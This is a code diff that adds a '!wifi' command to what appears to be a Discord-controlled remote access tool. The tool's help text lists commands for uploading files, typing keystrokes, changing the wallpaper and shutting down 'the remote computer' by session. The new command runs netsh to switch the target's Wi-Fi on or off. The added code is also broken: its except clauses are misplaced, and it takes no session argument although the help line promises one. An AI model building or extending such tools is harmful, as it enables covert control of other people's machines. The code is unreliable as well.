@@ -394,6 +394,32 @@ while True:
                 await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                 sesja = nowaSesja
 
+        @client.command()
+        async def wifi(ctx, action):
+            if action.lower() not in ['on', 'off']:
+                await ctx.send("Invalid action. Use 'on' or 'off'.")
+                return
+
+            try:
+                output = subprocess.check_output(['netsh', 'interface', 'show', 'interface'], shell=True).decode('utf-8')
+                wifi_interface = re.search(r'Wi-Fi', output)
+
+                if not wifi_interface:
+                    await ctx.send("Wi-Fi interface not found.")
+                    return
+
+                result = subprocess.check_output(['netsh', 'interface', 'set', 'interface', 'name="Wi-Fi"', f'admin={action}'], shell=True).decode('utf-8')
+
+                if "successfully" in result.lower():
+                    await ctx.send(f"Wi-Fi has been turned {action}.")
+                else:
+                    await ctx.send(f"Failed to turn Wi-Fi {action}. Check your permissions.")
+
+                    except subprocess.CalledProcessError as e:
+                        await ctx.send(f"An error occurred: {str(e)}")
+                    except Exception as e:
+                        await ctx.send(f"An unexpected error occurred: {str(e)}")
+
         @bot.command()
         async def shutdown(ctx, session):
             if session == "all":
@@ -481,6 +507,7 @@ while True:
 !up [session] - Increases the volume on the remote computer.
 !upload [session] [link] [file_name] - Sends a file to the remote computer.
 !wallpaper [session] [path] - Changes the wallpaper on the remote computer.
+!wifi [session] [on/off] - Turns Wi-Fi on or off
 !write [session] [message] - Types using the keyboard.
             '''
             await ctx.send(wiadomosc)
